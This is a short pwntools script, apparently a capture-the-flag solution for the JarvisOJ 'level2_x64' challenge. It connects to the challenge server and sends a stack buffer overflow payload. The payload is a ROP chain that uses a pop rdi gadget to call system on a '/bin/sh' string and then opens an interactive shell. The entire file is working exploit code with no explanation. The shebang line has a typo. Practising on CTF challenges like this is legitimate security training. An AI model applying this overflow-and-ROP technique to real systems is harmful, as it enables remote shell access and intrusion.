#!/usr/bin/envy python
from pwn import *

#sh = process("level2_x64")
sh = remote("pwn2.jarvisoj.com", 9882)
level2 = ELF("level2_x64")
pop_rdi_ret = 0x04006b3
sys_address = level2.symbols["system"]
bin_sh_addr = 0x600a90
payload = "a" * 0x80 + "bbbbbbbb" + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_address)
sh.sendline(payload)
sh.interactive()
